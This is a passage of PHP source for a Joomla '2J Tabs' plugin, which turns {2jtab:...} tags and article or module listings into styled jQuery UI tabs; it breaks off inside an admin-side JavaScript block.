<?php
defined( '_JEXEC' ) or die( 'Restricted access' );

$mainframe->registerEvent( 'onAfterInitialise', 'twoj_tabs_checkScriptInclede' );
$mainframe->registerEvent( 'onPrepareContent', 'twoj_tabs_inclede' );
//$mainframe->registerEvent( 'onPrepareContent', 'twoj_tabs_inclede_article' );

if (!function_exists( 'twoj_parse_tab' )) {
	function twoj_parse_tab($text_tab, &$tab_array, $params){
		$str_low = strtolower($text_tab);
		$tab_start = strpos( $str_low, '{2jtab:');
		$tab_close = strpos( $str_low, '}', $tab_start);
		if( $tab_start !== false && $tab_close !== false && $tab_start < $tab_close ){
			$tab_name = substr( $text_tab, $tab_start + 7,  $tab_close - 7 - $tab_start );
			$text_tab = str_replace( '{2jtab:'.$tab_name.'}', '', $text_tab );
			$str_low = strtolower($text_tab);
			$tab_start = strpos( $str_low, '{2jtab:');
			$tab_close = strpos( $str_low, '{/2jtabs}');
			if( $tab_start !== false ){
				$tab_content = substr( $text_tab, 0,  $tab_start );
				$text_tab = substr( $text_tab, $tab_start, strlen($text_tab) );
				$tab_array[] = array('name' => $tab_name, 'text' => $tab_content);
				return twoj_parse_tab($text_tab, $tab_array, $params);
			} elseif ( $tab_close !== false ){
				$tab_content = substr( $text_tab, 0,  $tab_close );
				$tab_array[] = array('name' => $tab_name, 'text' => $tab_content);
				return twoj_bilds_tabs($tab_array, $params);
			}
		}

	}
}
if (!function_exists( 'twoj_parse_tabs' )) {
	function twoj_parse_tabs(&$str, $params){
		$str_low = strtolower($str);
		$tab_array = array ();
		$start_tabs = strpos( $str_low, '{2jtab:');
		$end_tabs = strpos( $str_low, '{/2jtabs}');
		if($start_tabs!== false && $end_tabs!==false && $start_tabs < $end_tabs){
			$text_tabs = substr($str, $start_tabs, ($end_tabs-$start_tabs+9));
			$str = str_replace($text_tabs, twoj_parse_tab($text_tabs, $tab_array, $params), $str);
			return true;
		} else return false;
	}
}
if (!function_exists( 'twoj_tabs_bild_java' )) {
	function twoj_tabs_bild_java( $id, $params, $count=0  ) {
		$return_text = '';
		$effect 		= intval( $params->get( 'effect',	0) );
		$duration 		= intval( $params->get( 'duration', 200 ) );
		$ch_tabs 		= intval( $params->get( 'ch_tabs',	0) );
		$select_def		= intval( $params->get( 'select_def',	0) );
		$timer 			= intval( $params->get( 'timer', 0 ) );
		$timer_time 	= intval( $params->get( 'timer_time', 3000 ) );
		$align_tab		= intval( $params->get( 'align_tab', 0 ) );
		$all_height		= intval( $params->get( 'all_height', 0 ) );
		$div_height		= intval( $params->get( 'div_height', 0 ) );

		$eff_str = '';
		$select_def_text = '';
		if($effect){
			if( $effect==1)  $eff_str = ", fx: { height: 'toggle' ".($duration?", duration: ".$duration:'')."} ";
			if( $effect==2)  $eff_str = ", fx: { opacity: 'toggle'".($duration?", duration: ".$duration:'')."} ";
			if( $effect==3)  $eff_str = ", fx: { height: 'toggle', opacity: 'toggle'".($duration?", duration: ".$duration:'')."} ";
		}
		if($select_def && $select_def<= $count){
			$select_def_text = ',selected: '.($select_def-1);
		} elseif( $align_tab==2 ){
			$select_def_text = ',selected: '.($count-1);
		}
		if($div_height) $select_def_text = ',cleaer_h: 1';
		$return_text .='<script language="JavaScript" type="text/javascript">jq2j(document).ready(function(){jq2j("#twoj_container-'.$id.'  > ul").tabs({'.($ch_tabs?"event: 'mouseover'":" event: 'click'").$eff_str.$select_def_text."})".($timer?".tabs('rotate', ".$timer_time.")":'').";});</script>";
		return $return_text;
	}
}
if (!function_exists( 'twoj_init_tab_gl_array' )) {
	function twoj_init_tab_gl_array(){
		global $_TWOJ_INFO;
		if(!isset($_TWOJ_INFO)) $_TWOJ_INFO = array('jq_last'=>0, 'j.e'=>0, 'jq.w'=>0, 'css'=>0, 'uniqueid'=>0);
		if(!isset($_TWOJ_INFO['unique_tabs_id'])) 	$_TWOJ_INFO['unique_tabs_id'] = 0;
		if(!isset($_TWOJ_INFO['2j.ui.base'])) 		$_TWOJ_INFO['2j.ui.base'] = 0;
		if(!isset($_TWOJ_INFO['2j.ui.tabs'])) 		$_TWOJ_INFO['2j.ui.tabs'] = 0;
		if(!isset($_TWOJ_INFO['2j_tabs_css'])) 		$_TWOJ_INFO['2j_tabs_css'] = 0;
	}
}

if (!function_exists( 'twoj_bilds_tabs' )) {
	function twoj_bilds_tabs($tab_array, $params){
		global $_TWOJ_INFO;
		$numrows = count( $tab_array );
		$return_text = '';
		if ( $numrows ) {

			twoj_init_tab_gl_array();
			$uniqueid  = 'twoj_tabs_'.(++$_TWOJ_INFO['unique_tabs_id']);
			$TWOJ_TABS_UNICID = $_TWOJ_INFO['unique_tabs_id'];

			$titleintab		= intval( $params->get( 'titleintab',	0) );
			$tab_template 	=  $params->get( 'tab_template',	'');
			$page_bar		= intval( $params->get( 'page_bar', 0 ) );
			$skin			= intval( $params->get( 'style', 1 ) );
			$align_tab		= intval( $params->get( 'align_tab', 0 ) );

			$pending_need	= intval( $params->get( 'pending_need', 0 ) );
			$pend_li_left	= intval( $params->get( 'pend_li_left', 0 ) );
			$pend_li_right	= intval( $params->get( 'pend_li_right', 0 ) );
			$pend_ul_left	= intval( $params->get( 'pend_ul_left', 0 ) );
			$pend_ul_right	= intval( $params->get( 'pend_ul_right', 0 ) );

			$pend_all_left	=  $params->get( 'pend_all_left', '' );
			$pend_all_right	=  $params->get( 'pend_all_right', '' );
			$pend_all_top	=  $params->get( 'pend_all_top', '' );
			$pend_all_bottom=  $params->get( 'pend_all_bottom', '' );

			$all_width		=  $params->get( 'all_width', '' );
			$all_height		=  $params->get( 'all_height', '' );
			$div_height		=  $params->get( 'div_height', '' );

			$bg_color		=  $params->get( 'bg_color', '' );

			$enable_hover	=  intval($params->get( 'enable_hover', '' ));
			$font_tab		=  $params->get( 'font_tab', '' );
			$font_size_tab	=  $params->get( 'font_size_tab', '' );

			$tab_name_cut	=  $params->get( 'tab_name_cut', 0 );
			$tab_name_cut_text	=  $params->get( 'tab_name_cut_text', '' );

			$custom_label	=  $params->get( 'custom_label', '' );

			$add_div_style 	= array();
			$add_li_style 	= array();
			$add_ul_style 	= array();
			$add_all_style 	= array();
			$add_a_style 	= array();
			$add_span_style = array();

			if($font_tab){
				$add_a_style[] = 'font-family: '.$font_tab.' !important;';
				$add_span_style[] = 'font-family: '.$font_tab.' !important;';
			}
			if($font_size_tab){
				if( is_numeric($font_size_tab) ){
					$add_a_style[] = 'font-size: '.$font_size_tab.'px !important;';
					$add_span_style[] = 'font-size: '.$font_size_tab.'px !important;';
				} else {
					$add_a_style[] = 'font-size: '.$font_size_tab.' !important;';
					$add_span_style[] = 'font-size: '.$font_size_tab.' !important;';
				}
			}

			if($bg_color) {
				$add_li_style[] = 'background-color: '.$bg_color.' !important;';
				$add_ul_style[] = 'background-color: '.$bg_color.' !important;';
				$add_all_style[] = 'background-color: '.$bg_color.' !important;';
				$add_a_style[] = 'background-color: '.$bg_color.' !important;';
				$add_span_style[] = 'background-color: '.$bg_color.' !important;';
			}

			if ($align_tab==1) $add_li_style[] = 'float: left;';
			if ($align_tab==2) {
				$add_li_style[] = 'float: right !important;';
				$tab_array = array_reverse($tab_array);
				reset($tab_array);
			}

			if($pending_need){
				 $add_li_style[] = 'padding-left: 	'.$pend_li_left.	'px !important;';
				 $add_li_style[] = 'padding-right:  '.$pend_li_right.	'px !important;';
				 $add_ul_style[] = 'padding-left: 	'.$pend_ul_left.	'px !important;';
				 $add_ul_style[] = 'padding-right:	'.$pend_ul_right.	'px !important;';
			}

			if($pend_all_left!='')		$add_all_style[] = 'padding-left: 	'.(int)$pend_all_left.	'px !important;';
			if($pend_all_right!='')  	$add_all_style[] = 'padding-right: 	'.(int)$pend_all_right.	'px !important;';
			if($pend_all_top!='') 		$add_all_style[] = 'padding-top: 	'.(int)$pend_all_top.	'px !important;';
			if($pend_all_bottom!='') 	$add_all_style[] = 'padding-bottom: '.(int)$pend_all_bottom.'px !important;';

			if($all_width!=''){
				if( strpos( $all_width, '%')!==false || strpos( $all_width, 'px')!==false ) $add_all_style[] = ' width: 	'.$all_width.'; ';
					else $add_all_style[] = 'width: 	'.(int)$all_width.	'px !important;';
			}
			if($all_height!=''){
				if( strpos( $all_height, '%')!==false || strpos( $all_height, 'px')!==false ) $add_all_style[] = ' height: 	'.$all_height.'; ';
					else $add_all_style[] = 'height: 	'.(int)$all_height.	'px !important;';
			}

			if($div_height!=''){
				if( strpos( $div_height, '%')!==false || strpos( $div_height, 'px')!==false ) $add_div_style[] = ' height: 	'.$div_height.'; ';
					else $add_div_style[] = 'height: 	'.(int)$div_height.	'px !important;';
			}

			$show_border	= intval( $params->get( 'show_border', 0 ) );
			$color_border	= $params->get( 'color_border', '#000000' );

			if($show_border){
				if ($show_border==1) $add_div_style[] = 'border: 1px solid '.$color_border.' !important;';
				if ($show_border==2) $add_div_style[] = 'border: 0px none !important;';
			}

			$add_li_style[] = 'list-style: none none !important; background-image: none !important;';
			$add_ul_style[] = 'list-style: none none !important; background-image: none !important;';

			$div_style = '';	if(count($add_div_style))	$div_style = ' style="'.implode(' ', $add_div_style).'" ';
			$add_div_style[] = 'display: none;';
			$div_last_style = '';	if(count($add_div_style))	$div_last_style = ' style="'.implode(' ', $add_div_style).'" ';

			$li_style = '';		if(count($add_li_style))	$li_style = ' style="'.implode(' ', $add_li_style).'" ';
			$ul_style = '';		if(count($add_ul_style))	$ul_style = ' style="'.implode(' ', $add_ul_style).'" ';
			$all_style = '';	if(count($add_all_style))	$all_style = ' style="'.implode(' ', $add_all_style).'" ';
			$a_style = '';		if(count($add_a_style))		$a_style = ' style="'.implode(' ', $add_a_style).'" ';
			$span_style = '';	if(count($add_span_style))	$span_style = ' style="'.implode(' ', $add_span_style).'" ';

			$return_text .= twoj_tabs_bild_java( $TWOJ_TABS_UNICID, $params, $numrows  );
			$tabs_header = array();
			$tabs_text = '';
			$tab_count_link = 0;

			if( strpos($custom_label, "#;")!==false ) {
				$custom_label = explode( "#;", $custom_label);
			} else {
				$custom_label = explode( "\n", $custom_label);
			}
			foreach ($tab_array as $row){
				$tab_header_text = $row['name'];
				++$tab_count_link;
				if( $titleintab==1 ){
					if($tab_template){
						if ($align_tab==2) $tab_header_text = str_replace('#',(count($tab_array ) - $tab_count_link+1),$tab_template);
							else $tab_header_text = str_replace('#', $tab_count_link, $tab_template);
					} else $tab_header_text = $tab_count_link;
				}

				if($titleintab==2){
					if( count($custom_label) && isset($custom_label[$tab_count_link-1]) && $cus_text=trim($custom_label[$tab_count_link-1]) )
						$tab_header_text = $cus_text;
					 else
					 	$tab_header_text = $tab_count_link;
				}

				if($tab_name_cut && strlen($tab_header_text) > $tab_name_cut ){
					$tab_header_text = substr( $tab_header_text, 0, $tab_name_cut ).$tab_name_cut_text;
				}

				$tabs_header[] = '<li '.$li_style.' class="twoj_li'.($page_bar==1?'_bottom':'_top').'"><a href="#twoj_fragment'.$TWOJ_TABS_UNICID.'-'.$tab_count_link.'" '.$a_style.'><span '.$span_style.'>'.$tab_header_text."</span></a></li>";
				$tabs_text .= '<div id="twoj_fragment'.$TWOJ_TABS_UNICID.'-'.$tab_count_link.'" class="twoj_tab_content" '.($tab_count_link>1?$div_last_style:$div_style).'>'.$row['text'].'<div class="twoj_clr"></div></div>';
			}

			$pre_text = $params->get( 'pre_text', '' ) ;
			$post_text = $params->get( 'post_text', '' );


			$tabs_header = '<ul class="twoj_tablink'.($align_tab==2?' right_alg':'').'" '.$ul_style.' >'.implode('', $tabs_header).'</ul>';
			$return_text .='
				'.( $pre_text ? str_replace( "\n", "<br />", $pre_text) :'') .'
				<div id="twoj_container-'.$TWOJ_TABS_UNICID.'"  class="twoj_tabs_class'.($skin?$skin:'').($enable_hover?' enable_hover':'').($page_bar==1?' twoj_orient_bottom':' twoj_orient_top').($align_tab==2?' twoj_right_align':'').'" '.$all_style.' >'
				.($page_bar == 0?$tabs_header:'')
				.$tabs_text
				.($page_bar == 1?$tabs_header:'')
				.'</div>
				'.( $post_text  ? str_replace( "\n", "<br />", $post_text) :'') .'
				';
		}
		if($return_text) return  $return_text; else return null;
	}
}



if (!function_exists( 'twoj_tabs_inclede_article' )) {
	function twoj_tabs_inclede_article(  &$row, &$params, $page=0  ) {
		global $mainframe;
		if ($mainframe->isAdmin()) { return; }

		$plugin =& JPluginHelper::getPlugin('system', '2j_tabs');
		$plug_param 	= new JParameter( $plugin->params );

		if($enable_tabs=1) {
  			if(strpos($_SERVER['PHP_SELF'], "index.php")) {
				while (twoj_parse_tabs($row->text, $plug_param));
			} else {
   				if (preg_match_all("/{2jtab:.+?}/", $row->text, $matches, PREG_PATTERN_ORDER) > 0) {
    				foreach ($matches[0] as $match) {
      					$match = str_replace("{2jtab:", "", $match);
      					$match = str_replace("}", "", $match);
      					$row->text = str_replace( "{2jtab:".$match."}", "</div><div><h3>".$match."</h3>", $row->text );
      					$row->text = str_replace( "{/2jtabs}", "</div>", $row->text );
    				}
   				}
 			}
  		}
	}
}

if (!function_exists( 'twoj_get_tabs_text' )) {
	function twoj_get_tabs_text( $params ){
		global $mainframe;

		$return_text = '';

		$params->set('intro_only', 1);
	//	$params->set('hide_author', 1);
	//	$params->set('hide_createdate', 0);
	//	$params->set('hide_modifydate', 1);

		$access = new stdClass();
		$access->canEdit	= 0;
		$access->canEditOwn = 0;
		$access->canPublish = 0;

		$db 	=& JFactory::getDBO();
		$user 	=& JFactory::getUser();
		$aid	= $user->get('aid', 0);

		$orderby 		= intval( $params->get( 'orderby', 0 ) );
		$catid 			= intval( $params->get( 'catid' ) );
		$secid 			= intval( $params->get( 'secid' ) );
		$cat_or_sec 	= intval( $params->get( 'cat_or_sec', 0 ) );
		$items 			= intval( $params->get( 'items', 0 ) );
		$link_titles	= intval( $params->get( 'link_titles', 0 ) );
		$items_inpage	= intval( $params->get( 'items_inpage', 0 ) );

		if( $cat_or_sec != 3 ){

			jimport('joomla.utilities.date');
			$date = new JDate();
			$now = $date->toMySQL();

			$nullDate = $db->getNullDate();
			$noauth  = 0;
			// query to determine article count
			$query = 'SELECT a.*, u.name AS author, ' .
				' CASE WHEN CHAR_LENGTH(a.alias) THEN CONCAT_WS(":", a.id, a.alias) ELSE a.id END as slug,'.
				' CASE WHEN CHAR_LENGTH(cc.name) THEN CONCAT_WS(":", cc.id, cc.name) ELSE cc.id END as catslug '.
				( $orderby >= 9  ? "\n , ROUND( v.rating_sum / v.rating_count ) AS rating, v.rating_count" : '' ).
				' FROM #__content AS a' .
				' INNER JOIN #__categories AS cc ON cc.id = a.catid' .
				' INNER JOIN #__sections AS s ON s.id = a.sectionid' .
				( $orderby >= 9  ? "\n LEFT JOIN #__content_rating AS v ON a.id = v.content_id" : '' ).
				' LEFT JOIN #__users AS u ON u.id = a.created_by'.
				' WHERE a.state = 1 ' .
				($noauth ? ' AND a.access <= ' .(int) $aid. ' AND cc.access <= ' .(int) $aid. ' AND s.access <= ' .(int) $aid : '').
				' AND (a.publish_up = '.$db->Quote($nullDate).' OR a.publish_up <= '.$db->Quote($now).' ) ' .
				' AND (a.publish_down = '.$db->Quote($nullDate).' OR a.publish_down >= '.$db->Quote($now).' )'.
				($cat_or_sec==0 ? "\n AND cc.id = " . (int) $catid : '').
				($cat_or_sec==1 ? "\n AND s.id = " . (int) $secid : '').
				($cat_or_sec==2 ? '' : '').
				' AND cc.section = s.id' .
				' AND cc.published = 1' .
				' AND s.published = 1'
				.($orderby==0 ? "\n ORDER BY a.ordering" : "" )
				.($orderby==1 ? "\n ORDER BY a.title" : "" )
				.($orderby==2 ? "\n ORDER BY RAND()" : "" )
				.($orderby==3 ? "\n ORDER BY a.created DESC" : "" )
				.($orderby==4 ? "\n ORDER BY a.created ASC" : "" )
				.($orderby==5 ? "\n ORDER BY a.publish_up DESC" : "" )
				.($orderby==6 ? "\n ORDER BY a.publish_up ASC" : "" )
				.($orderby==7 ? "\n ORDER BY a.hits DESC" : "" )
				.($orderby==8 ? "\n ORDER BY a.hits ASC" : "" )
				.($orderby==9 ? "\n ORDER BY rating DESC" : "" )
				.($orderby==10 ? "\n ORDER BY rating ASC" : "" )
				;
			$db->setQuery($query, 0, $items);
			//echo $db->getQuery();
			$rows = $db->loadObjectList();
			$numrows = count( $rows );
		}
		if ( $cat_or_sec==3 || $numrows ) {
			$tab_array = array();

			if( $cat_or_sec == 3 ){
				$load_module = $params->get( 'load_module', '' );
				$load_module_style	= $params->get( 'load_module_style', 'xhtml' );
				if( strpos($load_module, "#;")!==false ) {
					$load_module = explode( "#;", $load_module);
				} else {
					$load_module = explode( "\n", $load_module);
				}
				global $TWOJ_TABS_IN_SELF;
				if( !isset ($TWOJ_TABS_IN_SELF) ) $TWOJ_TABS_IN_SELF = array();
				for($i=0;$i<count($load_module);$i++){
					$mod_pos_name = trim($load_module[$i]);
					if( isset($TWOJ_TABS_IN_SELF[$mod_pos_name]) && isset($TWOJ_TABS_IN_SELF[$mod_pos_name])==1  ){
						$tab_array[] = array('name'=> 'Custom Label', 'text'=>' ERROR: Module position ['.$mod_pos_name.'] show itself');
						continue;
					}
					if ( $mod_pos_name ){
						$TWOJ_TABS_IN_SELF[$mod_pos_name] = 1;
						$document	= &JFactory::getDocument();
						$renderer	= $document->loadRenderer('module');
						$params_temp= array('style'=>$load_module_style);
						$modules = '';
						foreach (JModuleHelper::getModules($mod_pos_name) as $mod)  {
							$modules .= $renderer->render($mod, $params_temp);
						}
						if($modules) $tab_array[] = array('name'=> $mod_pos_name, 'text'=>$modules);
					}
				}
			} else {
				$count_pag = 0; $temp_title = ''; $temp_text  = '';
				foreach ($rows as $row){
					if($items_inpage){
						if ( !$temp_title) $temp_title = $row->title;
						$temp_text  .= ($temp_text ? '<span class="article_seperator">&nbsp;</span>' : '') . output_twoj_tabs_plugin( $row, $params, $access );
						$count_pag++;
						if( $count_pag==$items_inpage || $count_pag > $items_inpage ){
							$tab_array[] = array('name'=>$temp_title, 'text'=>$temp_text);
							$count_pag = 0; $temp_title = ''; $temp_text  = '';
						}
					} else {
						$tab_array[] = array('name'=>$row->title, 'text'=>output_twoj_tabs_plugin( $row, $params, $access ));
					}
				}
				if( $count_pag > 0 && $items_inpage ) $tab_array[] = array('name'=>$temp_title, 'text'=>$temp_text);

			}
			$return_text .= twoj_bilds_tabs($tab_array, $params);
		}
		if($return_text) return  $return_text;
			else return null;
	}
}
if (!function_exists( 'twoj_cont_header' )) {
	function twoj_cont_header( $row, $params ){
		$ret_text_link = '';
		if ( $params->get( 'item_title' ) ) {
			if ( $params->get( 'link_titles' ) && $row->link_on != '' ) {
				$ret_text_link ='<a href="'.$row->link_on.'" class="contentpagetitle'.$params->get( 'moduleclass_sfx' ).'">'.$row->title.'</a>';
			} else {
				$ret_text_link = $row->title;
			}
		}
		return $ret_text_link;
	}
}

if (!function_exists( 'twoj_cont_getdate' )) {
	function twoj_cont_getdate( $create_date = null ){
		if ( intval( $create_date) != 0 ) {
			if( function_exists('mosFormatDate') ){
				$create_date = mosFormatDate( $create_date );
			}else{
				$create_date = JHTML::_('date', $create_date,   JText::_('DATE_FORMAT_LC2') );
			}
		}
		return $create_date;
	}
}

if (!function_exists( 'twoj_cont_readmore' )) {
	function twoj_cont_readmore( $row, $params ){
		$ret_text = '';
		if ( $params->get( 'readmore' ) ) {
			if ( $params->get( 'intro_only' ) && $row->readmore  ) {
				$ret_text ='<a href="'.$row->link_on.'" class="readon'.$params->get( 'moduleclass_sfx' ).'">'.JText::_('Read more...').'</a>';
			}
		}
		return $ret_text;
	}
}


if (!function_exists( 'twoj_word_limiter' )) {
	function twoj_word_limiter($text, $length = 100, $ending = '...', $exact = true, $considerHtml = true) {
        if ($considerHtml) {
            if (strlen(preg_replace('/<.*?>/', '', $text)) <= $length) {
                return $text;
            }
            preg_match_all('/(<.+?>)?([^<>]*)/s', $text, $lines, PREG_SET_ORDER);
            $total_length = strlen($ending);
            $open_tags = array();
            $truncate = '';
            foreach ($lines as $line_matchings) {
                if (!empty($line_matchings[1])) {
                    if (preg_match('/^<(\s*.+?\/\s*|\s*(img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param)(\s.+?)?)>$/is', $line_matchings[1])) {
                    } else if (preg_match('/^<\s*\/([^\s]+?)\s*>$/s', $line_matchings[1], $tag_matchings)) {
                        $pos = array_search($tag_matchings[1], $open_tags);
                        if ($pos !== false) {
                            unset($open_tags[$pos]);
                        }
                    } else if (preg_match('/^<\s*([^\s>!]+).*?>$/s', $line_matchings[1], $tag_matchings)) {
                        array_unshift($open_tags, strtolower($tag_matchings[1]));
                    }
                    $truncate .= $line_matchings[1];
                }
                $content_length = strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $line_matchings[2]));
                if ($total_length+$content_length > $length) {
                    $left = $length - $total_length;
                    $entities_length = 0;
                    if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $line_matchings[2], $entities, PREG_OFFSET_CAPTURE)) {
                        foreach ($entities[0] as $entity) {
                            if ($entity[1]+1-$entities_length <= $left) {
                                $left--;
                                $entities_length += strlen($entity[0]);
                            } else {
                                break;
                            }
                        }
                    }
                    $truncate .= substr($line_matchings[2], 0, $left+$entities_length);
                    break;
                } else {
                    $truncate .= $line_matchings[2];
                    $total_length += $content_length;
                }
                if($total_length >= $length) {
                    break;
                }
            }
        } else {
            if (strlen($text) <= $length) {
                return $text;
            } else {
                $truncate = substr($text, 0, $length - strlen($ending));
            }
        }
		if (!$exact) {
			$spacepos = strrpos($truncate, ' ');
			if (isset($spacepos)) {
				$truncate = substr($truncate, 0, $spacepos);
			}
		}
		$truncate .= $ending;
        if($considerHtml) {
            foreach ($open_tags as $tag) {
                $truncate .= '</' . $tag . '>';
            }
        }
		return $truncate;
	}
}

if (!function_exists( 'output_twoj_tabs_plugin' )) {
	function output_twoj_tabs_plugin( &$row, &$params, &$access ) {
		global $mainframe;
		require_once(JPATH_SITE.DS.'components'.DS.'com_content'.DS.'helpers'.DS.'route.php');

		if( $params->get( 'show_fulltext', 0 ) ){
			$row->text = $row->introtext . $row->fulltext;
			$row->readmore 	= 0;
		} else {
			$row->text = $row->introtext;
			$row->readmore 	= (trim( $row->fulltext ) != '');
		}

		$user 	=& JFactory::getUser();
		$aid	= (int) $user->get('aid', 0);
		$row->groups 	= '';
		$row->metadesc = '';
		$row->metakey 	= '';
		$row->access 	= 0;

		$ret_content = '';

		$content_count_word = $params->get( 'content_count_word', 0);
		$content_count_cut_text = $params->get( 'content_count_cut_text', '');
		$content_count_cut_word = $params->get( 'content_count_cut_word', '');

		if ($content_count_word) $row->text = twoj_word_limiter($row->text, $content_count_word, $content_count_cut_text, $content_count_cut_word);

		$params->set( 'twoj_tabs_inself', 			1 );
		if ($row->readmore || $params->get('link_titles')){
			if ($params->get('intro_only')){
				if ($row->access <= $aid) {
					$linkOn = JRoute::_(ContentHelperRoute::getArticleRoute($row->slug, $row->catslug, $row->sectionid));
				} else {
					$linkOn = JRoute::_('index.php?option=com_user&task=register');
				}
			}
			$row->link_on = $linkOn;
		}
		if (!$params->get('image')) {
			$row->text = preg_replace( '/<img[^>]*>/', '', $row->text );
		}

		$results = $mainframe->triggerEvent('onAfterDisplayTitle', array (&$row, &$params, 1));
		$row->afterDisplayTitle = trim(implode("\n", $results));

		$results = $mainframe->triggerEvent('onBeforeDisplayContent', array (&$row, &$params, 1));
		$row->beforeDisplayContent = trim(implode("\n", $results));

		// $ret_content .= $row->afterDisplayTitle;

		$ret_content .= $row->beforeDisplayContent;

		$ret_content .= twoj_parse_template($row, $params);

		return $ret_content;
	}
}


if (!function_exists( 'twoj_parse_template' )) {
	function twoj_parse_template( $row, $params ){
		$template =  $params->get( 'template', '' );
		if( isset($template) ) {
			$template = str_replace( "\n", "<br />", $template);
		}
		if(!$template){
			if ( $params->get( 'xhtml' )) {
				if ($params->get( 'item_title', 0 ) ) $template  = '<div class="contentpaneopen'.$params->get( 'moduleclass_sfx' ).'"><div class="contentheading'.$params->get( 'moduleclass_sfx' ).'" >@@TITLE@@</div></div>' . "\n";
				if( isset($row->afterDisplayTitle) ) $template .= '<div class="contentpaneopen'.$params->get( 'moduleclass_sfx' ).'">@@AFTERDISPLAYTITLE@@</div>' . "\n";
				$template .= '<div class="contentpaneopen'.$params->get( 'moduleclass_sfx' ).'">' . "\n";
				if ($params->get( 'show_autor', 0 ) ) $template .= '<div class="small">'.JText::_( 'Written by' ).' @@AUTHOR@@</div>' . "\n";
				if ($params->get( 'show_created', 0 ) ) $template .= '<div class="createdate" >@@CREATEDATE@@</div>' . "\n";
				$template .= '@@TEXT@@' . "\n";
				if ($params->get( 'show_modified', 0 ) ) $template .= '<div class="modifydate" align="left">'.JText::_( 'Last Updated' ).' ( @@MODIFIEDDATE@@ )</div>' . "\n";
				if ($params->get( 'readmore', 0 ) )  $template .= '@@READMORE@@'."\n";
				$template .= '</div>'."\n";
				//$template .= '@@LINKREADMORE@@';
			} else {
				if ($params->get( 'item_title', 0 ) ) $template  = '<table class="contentpaneopen'.$params->get( 'moduleclass_sfx' ).'"><tr><td class="contentheading'.$params->get( 'moduleclass_sfx' ).'" width="100%">@@TITLE@@</td></tr></table>' . "\n";
				if( isset($row->afterDisplayTitle) ) $template .= '<table  class="contentpaneopen'.$params->get( 'moduleclass_sfx' ).'"><tr><td>@@AFTERDISPLAYTITLE@@</td></tr></table>' . "\n";
				$template .= '<table class="contentpaneopen'.$params->get( 'moduleclass_sfx' ).'">' . "\n";
				if ($params->get( 'show_autor', 0 ) ) $template .= '<tr><td colspan="2" valign="top" width="70%" align="left"><span class="small">'.sprintf (JText::_( 'Written by' ), ' @@AUTHOR@@') .'</span>&nbsp;&nbsp;</td></tr>' . "\n";
				if ($params->get( 'show_created', 0 ) ) $template .= '<tr><td  colspan="2" class="createdate" valign="top">@@CREATEDATE@@</td></tr>' . "\n";
				$template .= '<tr><td valign="top" colspan="2">@@TEXT@@</td></tr>' . "\n";
				if ($params->get( 'show_modified', 0 ) ) $template .= '<tr><td colspan="2" class="modifydate" align="left">'.JText::_( 'Last Updated' ).' ( @@MODIFIEDDATE@@ )</td></tr>' . "\n";
				if ($params->get( 'readmore', 0 ) ) $template .= '<tr><td align="left" colspan="2">@@READMORE@@</td></tr>'. "\n";
				$template .= '</table>' . "\n";
				//$template .= '@@LINKREADMORE@@';

			}
		}
		if( isset($row->id) ) $template = str_replace('@@ID@@', $row->id, $template);
		$template = str_replace('@@TITLE@@', twoj_cont_header( $row, $params ), $template);
		if( isset($row->afterDisplayTitle) ) $template = str_replace('@@AFTERDISPLAYTITLE@@', $row->afterDisplayTitle, $template);

		if( isset($row->text) ) $template = str_replace('@@TEXT@@', $row->text, $template);
		$template = str_replace('@@READMORE@@', twoj_cont_readmore( $row, $params ), $template);
		if( isset($row->created) ) $template = str_replace('@@CREATEDATE@@', twoj_cont_getdate( $row->created ), $template);
		if( isset($row->link_on) ) $template = str_replace('@@LINKREADMORE@@', $row->link_on , $template);
		if( isset($row->author) ) $template = str_replace('@@AUTHOR@@', ( isset($row->created_by_alias) && $row->created_by_alias  ? $row->created_by_alias : $row->author ), $template);
		if( isset($row->created_by) ) $template = str_replace('@@AUTHORID@@', $row->created_by, $template);
		if( isset($row->modified) ) $template = str_replace('@@MODIFIEDDATE@@', twoj_cont_getdate( $row->modified ), $template);

		$template = str_replace(array('@@ID@@', '@@TITLE@@', '@@AFTERDISPLAYTITLE@@', '@@TEXT@@', '@@READMORE@@', '@@CREATEDATE@@', '@@LINKREADMORE@@', '@@AUTHOR@@', '@@AUTHORID@@', '@@MODIFIEDDATE@@'), '', $template);

		return $template;
	}
}

function twoj_tabs_checkScriptInclede (){
	global $mainframe, $TWOJ_jq_last;
	$format = JRequest::getVar( 'format', '' );
	if ($format == ( 'feed' && 'pdf' )) { return; }
	if (!isset($TWOJ_jq_last) ){
		JHTML::script('jq_last.js', 'plugins/system/2j_tabs/', false);
		$TWOJ_jq_last = 1;
	}
	if ($mainframe->isAdmin() ) {
		$document = &JFactory::getDocument();
		$content_script = '
		function twoj_isArray(obj){if (obj.constructor.toString().indexOf("Array") == -1) return false; else return true; }
		function thoj_set_map_element( triger, codes, elements ){
			if( jq2j("[name=\'params[twoj_ajax_admin]\']").val() != 2) return 0;

			var t_el = jq2j("[name=\'params["+triger+"]\']");

			for (var x = 0; x < elements.length; x++)
				if( twoj_isArray(elements[x]) ) for (var k = 0; k < elements[x].length; k++) jq2j("#params"+elements[x][k]+"-lbl").parent("span").parent("td").parent("tr").hide( );
				else jq2j("#params"+elements[x]+"-lbl").parent("span").parent("td").parent("tr").hide( );

			for (var x = 0; x < codes.length; x++)
				if( twoj_isArray(elements[x]) ) {
					for (var k = 0; k < elements[x].length; k++) if (t_el.val() == codes[x]) jq2j("#params"+elements[x][k]+"-lbl").parent("span").parent("td").parent("tr").show( );
				}else if ( t_el.val() == codes[x] ) jq2j("#params"+elements[x]+"-lbl").parent("span").parent("td").parent("tr").show( );


			t_el.click( function(){
				for (var x = 0; x < elements.length; x++)
					if( twoj_isArray(elements[x]) ) for (var k = 0; k < elements[x].length; k++) jq2j("#params"+elements[x][k]+"-lbl").parent("span").parent("td").parent("tr").hide( );
						else jq2j("#params"+elements[x]+"-lbl").parent("span").parent("td").parent("tr").hide( );

				for (var x = 0; x < codes.length; x++)
					if( twoj_isArray(elements[x]) ) {
						for (var k = 0; k < elements[x].length; k++) if (t_el.val() == codes[x]) jq2j("#params"+elements[x][k]+"-lbl").parent("span").parent("td").parent("tr").show( );
					}else if ( t_el.val() == codes[x] ) jq2j("#params"+elements[x]+"-lbl").parent("span").parent("td").parent("tr").show( );
				jq2j(".jpane-slider").css("height", "auto");
			});
		}

